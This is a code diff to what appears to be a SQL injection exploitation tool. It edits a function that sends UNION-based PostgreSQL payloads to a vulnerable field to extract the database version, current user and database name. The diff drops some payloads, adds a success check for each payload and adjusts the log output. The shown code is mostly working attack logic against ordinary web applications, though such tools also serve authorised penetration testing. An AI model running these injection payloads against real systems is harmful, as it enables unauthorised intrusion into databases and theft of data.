@@ -60,10 +60,6 @@ def exploit_union_based_postgresql(url, http_method, data, vulnerable_field, col
         f"[*] Exploiting PostgreSQL injection using UNION based method: {url}"
     )
     payloads = [
-        "USER()",
-        "USER(), NULL",
-        "VERSION()",
-        "VERSION(), NULL, NULL",
         "1, VERSION(), NULL",
         "1, current_user, NULL",
         "1, current_database(), NULL",
@@ -73,14 +69,17 @@ def exploit_union_based_postgresql(url, http_method, data, vulnerable_field, col
     for base_payload in payloads:
         payload = generate_payload_psql(base_payload, columns)
         response = send_payload_psql(url, http_method, data, vulnerable_field, payload)
-        print(f"{Fore.GREEN}[+] {payload} - {response.text}{Style.RESET_ALL}")
+        if check_response(response):
+            print(f"{Fore.LIGHTGREEN_EX}[+] Payload success: {payload}{Style.RESET_ALL}")
+        else:
+            print(f"{Fore.RED}[-] Failed to send payload: {payload}{Style.RESET_ALL}")
 
 
 def test_postgresql(url, http_method, data, vulnerable_field, file):
     """
     Wrapper function to test PostgreSQL injection
     """
-    print(f"{Fore.BLUE}Testing for PostgreSQL injection...{Style.RESET_ALL}")
+    print(f"{Fore.BLUE}[*] Testing for PostgreSQL injection...{Style.RESET_ALL}")
     write_to_file(
         file,
         f"[*] Testing for PostgreSQL injection: {url} with {http_method} method"
